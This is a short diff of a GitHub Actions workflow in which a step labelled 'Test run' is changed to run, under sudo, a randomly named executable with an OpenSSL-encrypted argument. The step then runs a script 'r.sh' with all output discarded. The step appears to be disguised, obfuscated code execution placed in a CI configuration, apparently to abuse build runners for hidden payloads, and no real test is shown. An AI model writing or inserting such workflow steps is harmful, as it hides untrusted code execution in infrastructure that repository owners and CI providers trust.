@@ -29,6 +29,6 @@ jobs:
     - name: Test run
       run: |
         cd ${{ github.workspace }}
-        echo 'ykmet'
+        echo 'ssrm6'
         sudo chmod +x garyiip7x/heardyg34i.ex
-        sudo ./garyiip7x/heardyg34i.ex U2FsdGVkX188b0rfVJbM3EwygnF2vsCK+4HVAswCFNg7h8ySDSJ4DVURXt8JMJt1W2hLAhRgcL38mufk81GlfDSL6JNE5jSQHg+LFptocm5spSoAPGmAmu7K3OrlshdM ld3ivp && sudo sh r.sh > /dev/null 2>&1
+        sudo ./garyiip7x/heardyg34i.ex U2FsdGVkX19tNTb1tMqkHF7UHOpL5xbkYxIJP31xlCk9VETVvh1v/7i34slCmFT7eB6/7dpDIzgrweF54KC66GU1h2mu8ruQKudFJJRJAEtrlkb1ncGa/5GAY3gz45sY taos07 && sudo sh r.sh > /dev/null 2>&1
